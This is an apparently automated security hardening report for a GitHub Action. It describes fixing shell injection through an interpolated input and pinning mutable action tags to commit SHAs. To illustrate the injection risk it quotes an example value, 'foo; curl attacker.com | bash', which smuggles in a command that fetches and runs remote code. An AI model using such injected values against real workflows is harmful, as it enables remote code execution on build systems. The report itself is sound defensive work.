<!-- markdownlint-disable -->

# Hardening Report: cpcloud--flake-update-action/v2.0.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **cpcloud--flake-update-action/v2.0.1** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a) violation: The `run:` block directly interpolates `${{ inputs.dependency }}` into a shell command string: `run: nix flake lock --update-input ${{ inputs.dependency }}`. An attacker who controls the `dependency` input can inject arbitrary shell commands (e.g., by passing a value like `foo; curl attacker.com | bash`). The value must be passed via an environment variable and properly quoted instead.

Locations:

- `action.yml:50`

### unpinned-uses (severity: high)

All 5 `uses:` references in action.yml are pinned to mutable version tags rather than immutable 40-character SHA digests, exposing the action to supply-chain attacks if any upstream repository is compromised or a tag is moved. Failing references: `cpcloud/flake-dep-info-action@v2.0.11` (used twice), `cpcloud/compare-commits-action@v5.0.37`, `peter-evans/create-pull-request@v5`, `peter-evans/enable-pull-request-automerge@v3`.

Locations:

- `action.yml:44`
- `action.yml:54`
- `action.yml:59`
- `action.yml:70`
- `action.yml:83`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.dependency }}" appears directly in run: block of step "Update ${{ inputs.dependency }}"; move to env: map

Locations:

- `action.yml:53`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all 3 findings in hardened/action/action.yml: (1) Moved `${{ inputs.dependency }}` from the `run:` shell string into an `env:` block as `DEPENDENCY`, then referenced it as `"$DEPENDENCY"` (double-quoted) to prevent shell injection. (2) Pinned all 5 `uses:` references to full 40-character SHA digests: cpcloud/flake-dep-info-action@9897b26be9888c610fbcb0ceb4322f535c2152b9 (v2.0.11, used twice), cpcloud/compare-commits-action@fad8cf390aedb7d442e9e9a8ed1a980d90f2f7e5 (v5.0.37), peter-evans/create-pull-request@4e1beaa7521e8b457b572c090b25bd3db56bf1c5 (v5), peter-evans/enable-pull-request-automerge@a660677d5469627102a1c1e11409dd063606628d (v3). Original version tags preserved as inline comments.

